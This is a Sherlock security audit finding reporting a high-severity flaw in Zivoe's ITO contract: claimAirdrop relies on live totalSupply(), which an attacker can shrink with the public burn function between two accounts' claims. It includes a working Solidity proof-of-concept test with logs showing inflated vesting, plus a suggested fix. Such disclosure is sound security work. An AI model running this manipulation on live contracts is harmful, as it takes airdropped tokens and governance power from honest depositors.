# SilverChariot - ITO can be manipulated

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Zivoe
**Keywords:** cybersecurity, vulnerability, SilverChariot, ITO, pZVE tokens, ZVE token, manipulation, totalSupply, claimAirdrop, vesting schedule, senior tokens, junior tokens, airdrop, stablecoins, governance power, malicious entity, exploitation, burn function, Test_ZivoeITO, manual review

---

SilverChariot

high

# ITO can be manipulated

## Summary
The ITO allocates 3 pZVE tokens per senior token minted and 1 pZVE token per junior token minted. When the offering period ends, users can claim the protocol \u0060ZVE token\u0060 depending on the share of all pZVE they hold. Only 5% of the total ZVE tokens will be distributed to users, which is equal to \u00601.25M\u0060 tokens.

The ITO can be manipulated because it  uses \u0060totalSupply()\u0060 in its calculations.
## Vulnerability Detail
[\u0060ZivoeITO.claimAirdrop()\u0060](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeITO.sol#L223-L228) calculates the amount of ZVE tokens that should be vested to a certain user. It then creates a vesting schedule and sends all junior and senior tokens to their recipient.

The formula is $pZVEOwned/pZVETotal * totalZVEAirdropped$ (in the code these are called \u0060upper\u0060, \u0060middle\u0060 and \u0060lower\u0060).

\u0060\u0060\u0060solidity
        uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
        uint256 middle = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply() / 20;
        uint256 lower = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply() * 3 + (
            IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply()
        );
\u0060\u0060\u0060

These calculations can be manipulated because they use \u0060totalSupply()\u0060.  The tranche tokens have a public [\u0060burn()\u0060](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeTrancheToken.sol#L72) function.

An attacker can use 2 accounts to enter the ITO. They will deposit large amounts of stablecoins towards the senior tranche. When the airdrop starts, they can claim their senior tokens and start vesting ZVE tokens. The senior tokens can then be burned. Now, when the attacker calls the \u0060claimAirdrop\u0060 function with their second account, the denominator of the above equation will be much smaller, allowing them to claim much more ZVE tokens than they are entitled to.

## Impact
There are 2 impacts from exploiting this vulnerability:
 - a malicious entity can claim excessively large part of the airdrop and gain governance power in the protocol
 - since the attacker would have gained unexpectedly large amount of ZVE tokens and the total ZVE to be distributed will be \u00601.25M\u0060, the users that claim after the attacker may not be able to do so if the amount they are entitled to, added to the stolen ZVE, exceeds \u00601.25M\u0060.

## Code Snippet
Add this function to [\u0060Test_ZivoeITO.sol\u0060](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-testing/src/TESTS_Core/Test_ZivoeITO.sol) and import the \u0060console\u0060.

You can comment the line where Sue burns their tokens and see the differences in the logs.

\u0060\u0060\u0060solidity
    function test_StealZVE() public {
        // Sam is an honest actor, while Bob is a malicious one
        mint("DAI", address(sam), 3_000_000 ether);
        mint("DAI", address(bob), 2_000_000 ether);
        zvl.try_commence(address(ITO));

        // Bob has another Ethereum account, Sue
        bob.try_transferToken(DAI, address(sue), 1_000_000 ether);
        
        // give approvals
        assert(sam.try_approveToken(DAI, address(ITO), type(uint256).max));
        assert(bob.try_approveToken(DAI, address(ITO), type(uint256).max));
        assert(sue.try_approveToken(DAI, address(ITO), type(uint256).max));

        // Sam deposits 2M DAI to senior tranche and 400k to the junior one
        hevm.prank(address(sam));
        ITO.depositBoth(2_000_000 ether, DAI, 400_000, DAI);
       
        // Bob deposits 2M DAI into the senior tranche using his both accounts
        hevm.prank(address(bob));
        ITO.depositSenior(1_000_000 ether, DAI);

        hevm.prank(address(sue));
        ITO.depositSenior(1_000_000 ether, DAI);

        // Move the timestamp after the end of the ITO
        hevm.warp(block.timestamp + 31 days);
        
        ITO.claimAirdrop(address(sue));
        (, , , uint256 totalVesting, , , ) = vestZVE.viewSchedule(address(sue));

        // Sue burn all senior tokens
        vm.prank(address(sue));
        zSTT.burn(1_000_000 ether);

        console.log(\u0027Sue vesting: \u0027, totalVesting / 1e18);

        ITO.claimAirdrop(address(bob));
        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(bob));

        console.log(\u0027Bob vesting: \u0027, totalVesting / 1e18);

        ITO.claimAirdrop(address(sam));
        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(sam));

        console.log(\u0027Sam vesting: \u0027, totalVesting / 1e18);
    }
\u0060\u0060\u0060


Fair vesting without prior burning
\u0060\u0060\u0060solidity
  Sue vesting:  312499
  Bob vesting:  312499
  Sam vesting:  625001
\u0060\u0060\u0060

Vesting after burning
\u0060\u0060\u0060solidity
  Sue vesting:  312499
  Bob vesting:  416666
  Sam vesting:  833333
\u0060\u0060\u0060

Bob and Sue will be able to claim \u0060~750 000\u0060 ZVE tokens and Sam will not be able to claim any, because the total exceeds \u00601.25M\u0060.
## Tool used

Manual Review

## Recommendation
Introduce a few new variables in the ITO contract.
\u0060\u0060\u0060solidity
   bool hasAirdropped;
   uint256 totalZVE;
   uint256 totalzSTT; 
   uint256 totalzJTT;
\u0060\u0060\u0060

Then check if the call to \u0060claimAidrop\u0060 is a first one and if it is, initialize the variables. Use these variables in the vesting calculations.

\u0060\u0060\u0060solidity
    function claimAirdrop(address depositor) external returns (
        uint256 zSTTClaimed, uint256 zJTTClaimed, uint256 ZVEVested
    ) {
            ...
            if (!hasAirdropped) {
                  totalZVE = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply();
                  totalzSTT = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply();
                  totalzJTT = IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply();
                  hasAirdropped = true;
            }
            ...

           uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
           uint256 middle = totalZVE / 20;
           uint256 lower = totalzSTT * 3 + totalzJTT;
      }
\u0060\u0060\u0060
